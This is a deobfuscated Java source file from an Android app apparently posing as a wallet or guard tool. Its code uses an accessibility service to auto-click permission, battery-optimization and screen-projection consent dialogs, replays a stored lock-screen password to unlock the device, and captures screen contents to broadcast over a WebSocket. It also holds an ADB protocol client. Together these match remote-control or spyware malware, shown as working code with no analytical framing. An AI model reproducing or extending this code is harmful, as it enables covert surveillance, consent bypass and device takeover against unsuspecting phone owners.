package com.guard.wallet.delegate.task;

import com.guard.wallet.core.AppUtils;

import android.util.Log;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.delegate.EngineHelper;
import com.guard.wallet.delegate.FilterHelper;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.msg.ReadScreenMessage;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.io.InputStream;
import java.security.PrivateKey;
import java.security.interfaces.RSAPublicKey;
import java.util.Iterator;
import java.util.Objects;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import javax.crypto.Cipher;
import javax.net.ssl.SSLSocket;

/**
 * 锁屏密码确认 Runnable — 多用途分发器。
 *
 * vendor 原始路径: o/a.java (372 行)
 * 功能: 10 个 case — keepInBatteryUnRestricted / inConfirmLock /
 *       allowInGrantPermission / allowInMediaProjection / c0 readScreen /
 *       NIO selector wakeup / f0.r / HttpResponse / ConnectionPool socket pool /
 *       ADB protocol handler。
 */
public final class ConfirmLockRunnable implements Runnable {
    public final int a;
    public final Object b;

    public ConfirmLockRunnable(Object obj, int i2) {
        this.a = i2;
        this.b = obj;
    }

    @Override
    public final void run() {
        switch (this.a) {
            case 0:
                /* keepInBatteryUnRestricted — click allow/cancel battery optimization */
                com.guard.wallet.engine.KeepAliveEngine cVar = (com.guard.wallet.engine.KeepAliveEngine) this.b;
                cVar.getClass();
                try {
                    UiObject findOneByOperateOrLoop = cVar.k().findOneByOperateOrLoop(com.guard.wallet.engine.KeepAliveEngine.I());
                    if (findOneByOperateOrLoop != null && findOneByOperateOrLoop.click()) {
                        Log.d("o.c", "已点击允许忽略电池优化");
                        com.guard.wallet.helper.BlockViewManager.h(5);
                    } else {
                        UiObject findOneByCombineLoop = cVar.k().findOneByCombineLoop(com.guard.wallet.engine.KeepAliveEngine.N());
                        if (findOneByCombineLoop != null && findOneByCombineLoop.click()) {
                            Log.d("o.c", "已点击对话框取消按钮");
                        }
                    }
                    cVar.n.remove("keepInBatteryUnRestricted");
                } catch (Exception e2) {
                    AppUtils.s("o.c", e2);
                }
                return;

            case 1:
                /* inConfirmLock — confirm lock screen password delegate */
                com.guard.wallet.delegate.ConfirmLockDelegate iVar = (com.guard.wallet.delegate.ConfirmLockDelegate) this.b;
                iVar.getClass();
                boolean success = false;
                com.guard.wallet.utils.SystemHelper.T0(25);
                ReqUnlockDeviceVO g2 = com.guard.wallet.utils.SharedPrefsManager.g();
                if (g2 != null) {
                    success = iVar.K(g2);
                }
                if (!success) {
                    ReqUnlockDeviceVO g3 = com.guard.wallet.utils.SharedPrefsManager.f();
                    if (g3 != null) {
                        success = iVar.K(g3);
                        g2 = g3;
                    }
                }
                if (success) {
                    Log.d("ConfirmLockDelegate", "已完成锁屏密码验证代理");
                    g2.setLocked(Boolean.TRUE);
                    com.guard.wallet.utils.SharedPrefsManager.C(g2);
                }
                iVar.o.remove("inConfirmLock");
                return;

            case 2:
                /* allowInGrantPermission — click allow permission buttons */
                com.guard.wallet.delegate.GrantPermissionDelegate lVar = (com.guard.wallet.delegate.GrantPermissionDelegate) this.b;
                int i2 = com.guard.wallet.delegate.GrantPermissionDelegate.__synthetic_0;
                UiObject findOneByCombine = null;
                if (lVar.k() != null) {
                    UiObject k2 = lVar.k();
                    CombineFilter combineFilter = new CombineFilter();
                    combineFilter.getStringConditions().add(FilterHelper.initFilter(combineFilter, "className", "android.widget.Button"));
                    StringCondition stringCondition = new StringCondition();
                    stringCondition.setProperty("id");
                    stringCondition.setSuffix(":id/permission_allow_always_button");
                    combineFilter.getStringConditions().add(stringCondition);
                    findOneByCombine = k2.findOneByCombine(combineFilter);

                    if (findOneByCombine == null) {
                        UiObject k3 = lVar.k();
                        CombineFilter combineFilter2 = new CombineFilter();
                        combineFilter2.getStringConditions().add(FilterHelper.initFilter(combineFilter2, "className", "android.widget.Button"));
                        StringCondition stringCondition2 = new StringCondition();
                        stringCondition2.setProperty("id");
                        stringCondition2.setSuffix(":id/permission_allow_button");
                        combineFilter2.getStringConditions().add(stringCondition2);
                        findOneByCombine = k3.findOneByCombine(combineFilter2);
                    }

                    if (findOneByCombine == null) {
                        UiObject k4 = lVar.k();
                        CombineFilter combineFilter3 = new CombineFilter();
                        combineFilter3.getStringConditions().add(FilterHelper.initFilter(combineFilter3, "className", "android.widget.Button"));
                        StringCondition stringCondition3 = new StringCondition();
                        stringCondition3.setProperty("id");
                        stringCondition3.setSuffix(":id/permission_allow_foreground_only_button");
                        combineFilter3.getStringConditions().add(stringCondition3);
                        findOneByCombine = k4.findOneByCombine(combineFilter3);
                    }

                    if (findOneByCombine == null) {
                        UiObject k5 = lVar.k();
                        CombineFilter combineFilter4 = new CombineFilter();
                        combineFilter4.getStringConditions().add(FilterHelper.initFilter(combineFilter4, "className", "android.widget.Button"));
                        StringCondition stringCondition4 = new StringCondition();
                        stringCondition4.setProperty("id");
                        stringCondition4.setSuffix(":id/permission_allow_one_time_button");
                        combineFilter4.getStringConditions().add(stringCondition4);
                        findOneByCombine = k5.findOneByCombine(combineFilter4);
                    }

                    if (findOneByCombine != null && findOneByCombine.click()) {
                        Log.d("o.l", "已点击允许权限申请");
                    }
                }
                lVar.n.remove("allowInGrantPermission");
                return;

            case 3:
                /* allowInMediaProjection — click allow screen projection */
                com.guard.wallet.delegate.MediaProjectionDelegate oVar = (com.guard.wallet.delegate.MediaProjectionDelegate) this.b;
                int i3 = com.guard.wallet.delegate.MediaProjectionDelegate.__synthetic_0;
                UiObject k6 = oVar.k();
                CombineFilter combineFilter5 = new CombineFilter();
                combineFilter5.getStringConditions().add(FilterHelper.addConditionWithEquals(combineFilter5, FilterHelper.initFilter(combineFilter5, "className", "android.widget.Button"), "id", "android:id/button1"));
                UiObject findOneByCombineLoop2 = k6.findOneByCombineLoop(combineFilter5);
                if (findOneByCombineLoop2 != null && findOneByCombineLoop2.click()) {
                    Log.d("o.o", "已点击允许屏幕投影权限");
                }
                oVar.n.remove("allowInMediaProjection");
                return;

            case 4:
                /* c0 readScreen — capture screen and send to server */
                AtomicBoolean atomicBoolean = ((com.guard.wallet.delegate.DelegateUtils) this.b).b;
                try {
                    atomicBoolean.set(true);
                    if (MyAccessibilityService.P() != null) {
                        String N = com.guard.wallet.utils.SharedPrefsManager.N(new ReadScreenMessage(MyAccessibilityService.P().k0()));
                        if (Integer.valueOf(com.guard.wallet.server.WebSocketManager.getInstance().screenListeners.size()).intValue() > 0) {
                            com.guard.wallet.server.WebSocketManager.getInstance().broadcast(N);
                        }
                        if (AppUtils.z()) {
                            AppUtils.F(N);
                        }
                    }
                } catch (Exception e3) {
                    AppUtils.s("o.c0", e3);
                }
                atomicBoolean.set(false);
                return;

            case 5:
                /* NIO selector wakeup — removed: NIO layer deleted, now using AndroidAsync 3.1.0 */
                return;

            case 6:
                /* NIO ChunkedWriter — removed: NIO layer deleted */
                return;

            case 7:
                /* NIO HttpResponse/CloseCallback — removed: NIO layer deleted */
                return;

            case 8:
                /* ConnectionPool — socket pool cleanup loop */
                com.guard.wallet.http.ConnectionPool pool = (com.guard.wallet.http.ConnectionPool) this.b;
                pool.getClass();
                while (true) {
                    long nanoTime = System.nanoTime();
                    long j2;
                    synchronized (pool) {
                        Iterator it = pool.d.iterator();
                        long j3 = Long.MIN_VALUE;
                        com.guard.wallet.http.ConnectionPool.ConnectionEntry evictEntry = null;
                        int i6 = 0;
                        int i7 = 0;
                        while (it.hasNext()) {
                            com.guard.wallet.http.ConnectionPool.ConnectionEntry entry = (com.guard.wallet.http.ConnectionPool.ConnectionEntry) it.next();
                            if (pool.b(entry, nanoTime) > 0) {
                                i7++;
                            } else {
                                i6++;
                                long j4 = nanoTime - entry.q;
                                if (j4 > j3) {
                                    evictEntry = entry;
                                    j3 = j4;
                                }
                            }
                        }
                        j2 = pool.b;
                        if (j3 < j2 && i6 <= pool.a) {
                            if (i6 > 0) {
                                j2 -= j3;
                            } else if (i7 <= 0) {
                                pool.f = false;
                                j2 = -1;
                            }
                        } else {
                            pool.d.remove(evictEntry);
                            try { if (evictEntry.e != null) evictEntry.e.close(); } catch (Exception ignored) {}
                            j2 = 0;
                        }
                    }
                    if (j2 == -1) {
                        return;
                    }
                    if (j2 > 0) {
                        long j5 = j2 / 1000000;
                        int nanos = (int) (j2 - (1000000 * j5));
                        synchronized (pool) {
                            try {
                                pool.wait(j5, nanos);
                            } catch (InterruptedException unused3) {
                            }
                        }
                    }
                }

            default:
                /* b1.d — ADB protocol handler loop */
                com.guard.wallet.adb.AdbConnection dVar = (com.guard.wallet.adb.AdbConnection) this.b;
                try {
                    while (!dVar.j.isInterrupted()) {
                        InputStream inputStream;
                        if (dVar.u) {
                            inputStream = dVar.h;
                            Objects.requireNonNull(inputStream);
                        } else {
                            inputStream = dVar.f;
                        }
                        com.guard.wallet.adb.AdbMessageParser a2 = com.guard.wallet.adb.AdbMessageParser.a(inputStream, dVar.p, dVar.o);
                        int i8 = a2.a;
                        switch (i8) {
                            case 1163086915:
                            case 1163154007:
                            case 1497451343:
                                if (dVar.n) {
                                    com.guard.wallet.adb.AdbStream hVar = (com.guard.wallet.adb.AdbStream) dVar.t.get(Integer.valueOf(a2.c));
                                    if (hVar != null) {
                                        synchronized (hVar) {
                                            int i9 = a2.a;
                                            if (i9 == 1497451343) {
                                                hVar.c = a2.b;
                                                hVar.d.set(true);
                                                hVar.notify();
                                            } else if (i9 == 1163154007) {
                                                hVar.x(a2.g);
                                                hVar.a.A(com.guard.wallet.adb.AdbMessageBuilder.b(1497451343, hVar.b, null, hVar.c));
                                            } else {
                                                dVar.t.remove(Integer.valueOf(a2.c));
                                                Log.d("d", "AdbProtocol A_CLSE.");
                                                hVar.A(true);
                                            }
                                        }
                                    }
                                }
                                break;
                            case 1213486401:
                                byte[] bArr;
                                if (!dVar.u && a2.b == 1) {
                                    if (!dVar.s) {
                                        PrivateKey privateKey = dVar.q.a;
                                        byte[] payload = a2.g;
                                        int[] iArr = com.guard.wallet.adb.AdbRsaCrypto.a;
                                        Cipher cipher = Cipher.getInstance("RSA/ECB/NoPadding");
                                        cipher.init(1, privateKey);
                                        cipher.update(com.guard.wallet.adb.AdbRsaCrypto.b);
                                        bArr = com.guard.wallet.adb.AdbMessageBuilder.b(1213486401, 2, cipher.doFinal(payload), 0);
                                        Log.d("d", "AdbProtocol.ADB_AUTH_SIGNATURE");
                                        dVar.s = true;
                                    } else if (dVar.l) {
                                        dVar.m = true;
                                        break;
                                    } else {
                                        bArr = com.guard.wallet.adb.AdbMessageBuilder.b(1213486401, 3, com.guard.wallet.adb.AdbRsaCrypto.c((RSAPublicKey) dVar.q.b.getPublicKey(), dVar.r), 0);
                                        Log.d("d", "AdbProtocol.ADB_AUTH_RSAPUBLICKEY");
                                    }
                                    Log.d("d", "Write the AUTH reply");
                                    dVar.A(bArr);
                                }
                                break;
                            case 1314410051:
                                synchronized (dVar) {
                                    dVar.p = a2.b;
                                    dVar.o = a2.c;
                                    dVar.n = true;
                                    dVar.notifyAll();
                                }
                                Log.d("d", "AdbProtocol.A_CNXN");
                                /* fall through to STLS */
                            case 1397511251:
                                dVar.A(com.guard.wallet.adb.AdbMessageBuilder.b(1397511251, 16777216, null, 0));
                                SSLSocket sSLSocket = (SSLSocket) AppUtils.y(dVar.q).getSocketFactory().createSocket(dVar.a, dVar.b, dVar.c, true);
                                sSLSocket.startHandshake();
                                Log.d("d", "Handshake succeeded.");
                                synchronized (dVar) {
                                    dVar.h = sSLSocket.getInputStream();
                                    dVar.i = sSLSocket.getOutputStream();
                                    dVar.u = true;
                                }
                                break;
                            default:
                                Log.e("d", String.format("Unrecognized command = 0x%x", Integer.valueOf(i8)));
                                break;
                        }
                    }
                } catch (Exception e4) {
                    AppUtils.s("d", e4);
                }
                synchronized (dVar) {
                    dVar.x();
                    dVar.notifyAll();
                    dVar.n = false;
                    dVar.k = false;
                }
                return;
        }
    }
}
